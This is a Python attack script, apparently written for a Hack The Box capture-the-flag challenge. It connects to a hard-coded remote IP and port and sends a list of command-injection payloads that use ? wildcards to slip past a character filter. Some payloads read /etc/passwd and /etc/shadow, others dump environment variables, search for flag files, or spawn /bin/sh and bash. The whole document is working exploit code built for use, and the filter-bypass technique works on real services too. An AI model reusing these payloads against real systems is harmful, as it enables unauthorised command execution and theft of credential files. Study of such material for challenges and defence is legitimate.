import socket
import time
import json
import sys

# Configuration
HOST = "94.237.123.87"
PORT = 44123

# Custom payloads based on initial findings
custom_payloads = [
    # Directory listing attempts using /bin/ls (which we know exists)
    "$(/???/ls)",                    # Try to execute /bin/ls
    "$(/???/ls /)",                  # List root directory
    "$(/???/ls /???)",               # List /bin directory
    "$(/???/ls /???/)",              # List /bin/ directory
    "$(/???/ls /????)",              # List /home directory
    "$(/???/ls /????/)",             # List /home/ directory
    "$(/???/ls /????/????)",         # List /home/user directory
    
    # File reading attempts using /bin/cat
    "$(/???/cat /???/????)",         # Try to read /etc/passwd
    "$(/???/cat /???/????/????)",    # Try to read /etc/shadow/group
    "$(/???/cat /????/????)",        # Try to read /home/user
    "$(/???/cat /????/????/????)",   # Try to read /home/user/flag
    "$(/???/cat /????/????/????/????)", # Try to read /home/user/flag/flag
    
    # Command execution with different binaries
    "$(/???/id)",                    # Get user ID
    "$(/???/env)",                   # Get environment variables
    "$(/???/pwd)",                   # Get current directory
    "$(/???/ps)",                    # List processes
    
    # Exploring specific directories
    "$(/???/ls /???/???)",           # List /bin/bin
    "$(/???/ls /???/????)",          # List /bin/sbin
    "$(/???/ls /???/???/)",          # List /bin/bin/
    "$(/???/ls /???/????/)",         # List /bin/sbin/
    
    # Trying to find the flag
    "$(/???/find / -name ????)",     # Find files named flag
    "$(/???/find / -name ????.???)", # Find files with .txt extension
    "$(/???/grep ???? /)",           # Grep for flag in root
    "$(/???/grep ???? /????/????)",  # Grep for flag in /home/user
    
    # Trying to execute shell
    "$(/???/sh)",                    # Try to execute /bin/sh
    "$(/???/bash)",                  # Try to execute /bin/bash
    
    # Trying to use cp to copy files
    "$(/???/cp /????/????/???? /???/????)", # Copy flag to /tmp/flag
    
    # Trying to use more specific commands
    "$(/???/echo $PATH)",            # Echo PATH
    "$(/???/echo $PWD)",             # Echo PWD
    "$(/???/echo $USER)",            # Echo USER
    
    # Trying to use wildcards more effectively
    "$(/???/ls /?)",                 # List all single-character directories in root
    "$(/???/ls /??)",                # List all two-character directories in root
    "$(/???/ls /???)",               # List all three-character directories in root
    
    # Trying to read specific files that might contain flags
    "$(/???/cat /????)",             # Try to read /flag
    "$(/???/cat /???/????)",         # Try to read /etc/flag
    "$(/???/cat /????/????)",        # Try to read /home/flag
]

def connect_to_service():
    """Connects to the remote service."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")
        
        # Receive initial banner
        banner = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[+] Banner received:")
        print(banner)
        
        return sock
    except Exception as e:
        print(f"[-] Error connecting to {HOST}:{PORT}: {e}")
        return None

def send_payload(sock, payload):
    """Sends a single payload and returns the response."""
    try:
        print(f"\n[+] Sending payload: {repr(payload)}")
        sock.sendall((payload + '\n').encode())
        time.sleep(1)  # Give the server time to respond
        
        # Receive response
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[*] Response:")
        print(response)
        
        return {"payload": payload, "response": response}
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return {"payload": payload, "error": str(e)}

def main():
    """Main function to run the custom payloads."""
    results = []
    
    sock = connect_to_service()
    if not sock:
        sys.exit(1)
    
    try:
        for i, payload in enumerate(custom_payloads):
            print(f"\n[*] Testing payload {i+1}/{len(custom_payloads)}")
            result = send_payload(sock, payload)
            results.append(result)
            
            # Save results after each test
            with open('custom_results.json', 'w') as f:
                json.dump(results, f, indent=2)
            
            # Check if the response contains anything interesting
            response = result.get("response", "")
            if "flag" in response.lower() or "htb" in response.lower():
                print("[!] Potential flag found in response!")
    
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")
    finally:
        try:
            sock.close()
        except:
            pass
        
        print("\n[+] Testing complete. Results saved to custom_results.json")
        print("[*] Promising payloads to try manually:")
        for result in results:
            payload = result.get("payload", "")
            response = result.get("response", "")
            if len(response) > 0 and "Broken@Shell$" not in response and "Error: Command contains disallowed characters" not in response:
                print(f"  - {payload}")

if __name__ == "__main__":
    main()
